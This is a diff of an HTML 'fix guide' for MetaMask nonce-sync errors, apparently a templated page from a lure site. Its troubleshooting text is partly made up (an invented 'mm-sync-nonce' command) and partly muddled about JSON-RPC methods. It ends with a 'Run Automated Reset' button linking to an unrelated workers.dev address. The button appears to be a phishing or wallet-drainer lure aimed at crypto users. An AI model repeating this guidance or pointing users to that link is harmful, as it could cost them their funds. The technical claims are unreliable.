@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #0a0c10;
+        font-family: system-ui;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -46,24 +46,30 @@
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch between the expected nonce value stored in MetaMask and the actual nonce value on the Ethereum blockchain, often resulting from pending or failed transactions.</li>
+<li>The error occurs due to a mismatch between the expected nonce value stored in MetaMask and the actual nonce value on the Ethereum blockchain, often caused by concurrent transactions or network congestion.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the MetaMask account to sync the nonce value with the blockchain:</li>
-<li>Delete the <code>nonce</code> field in the MetaMask local storage</li>
-<li>Update the <code>transactions</code> field to reflect the current blockchain state</li>
-<li>Use the following command to reset the nonce:</li>
+<li>Reset the MetaMask account to resynchronize the nonce: <code>eth_accounts</code> and <code>eth_getTransactionCount</code> should be used to verify the account balance and transaction count.</li>
+<li>Use the following JSON-RPC method to retrieve the current nonce:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>mm-sync-nonce<span class="w"> </span>--account<span class="w"> </span>&lt;account_address&gt;<span class="w"> </span>--rpc<span class="w"> </span>&lt;rpc_url&gt;
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_getTransactionCount&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;latest&quot;</span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
 </code></pre></div>
 
+<ul>
+<li>Manually set the correct nonce value in MetaMask using the <code>eth_sendTransaction</code> method with the <code>nonce</code> parameter.</li>
+</ul>
 <p>Prerequisites:
 * MetaMask extension installed and configured
-* Ethereum account with pending or failed transactions
-* Access to the Ethereum RPC endpoint</p>
-<p>Consider utilizing an external console for advanced troubleshooting and nonce management.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-account-discovery-and-syncs-error-for-so.html">Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</a></li></ul>
+* Ethereum account with a positive balance
+* Basic understanding of JSON-RPC methods and Ethereum transactions</p>
+<p>Consider utilizing an external console, such as Ethereum's geth console, to manually verify and adjust the nonce value.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reconnect</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
